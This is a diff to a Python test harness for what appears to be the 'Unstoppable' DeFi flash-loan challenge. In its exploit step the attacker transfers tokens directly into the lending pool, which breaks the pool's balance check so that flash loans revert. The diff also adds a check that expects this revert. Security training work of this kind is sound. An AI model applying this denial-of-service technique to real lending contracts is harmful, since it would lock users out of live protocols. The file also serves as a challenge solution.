@@ -31,7 +31,7 @@ class UnstoppableChecker():
 
     def setup(self):
         """performs required deployments and token transfers prior to running the exploit"""
-        self.token.approve(self.pool.address, self.TOKENS_IN_POOL, {"from": self.deployer})
+        self.token.approve(self.pool.address, self.TOKENS_IN_POOL + self.INITIAL_ATTACKER_BALANCE/2, {"from": self.deployer})
         self.pool.depositTokens(self.TOKENS_IN_POOL, {"from": self.deployer})
         self.token.transfer(self.attacker, self.INITIAL_ATTACKER_BALANCE, {"from": self.deployer})
         print(f"Setup Check 1 passed: {self.token.balanceOf(self.pool.address) == self.TOKENS_IN_POOL}")
@@ -41,20 +41,26 @@ class UnstoppableChecker():
         """tests contracts executeFlashLoan method pre-exploit"""
         print("PRE EXPLOIT TEST RUNNING...")
         self.receiverContract.executeFlashLoan(10, {"from": self.some_user})
-        self.receiverContract.executeFlashLoan(10, {"from": self.some_user})
-        self.receiverContract.executeFlashLoan(10, {"from": self.some_user})
-        self.receiverContract.executeFlashLoan(10, {"from": self.some_user})
 
     def exploit(self):
-        """write exploit code here"""
+        """WRITE EXPLOIT HERE"""
         print("RUNNING EXPLOIT...")
         self.token.transfer(self.pool.address, self.INITIAL_ATTACKER_BALANCE, {"from": self.attacker })
         return
 
+    def exploit_outcome(self):
+        """returns True if exploit outcome is as expected"""
+        return self.receiverContract.executeFlashLoan(10, {"from": self.some_user}).revert_msg == "Transaction reverted without a reason string"
+
     def test_contract_post_exploit(self):
         """tests contracts executeFlashLoan method post exploit"""
         print("POST EXPLOIT TEST RUNNING...")
-        self.receiverContract.executeFlashLoan(10, {"from": self.some_user})
+        try:
+            assert(self.exploit_outcome())
+        except:
+            print("Exploit did not pass: \u274E \n Expected a transaction revert")
+            return
+        print("Passed: \u2705")
     
     def ether(self, amount):
         """receives number and converts to wei"""
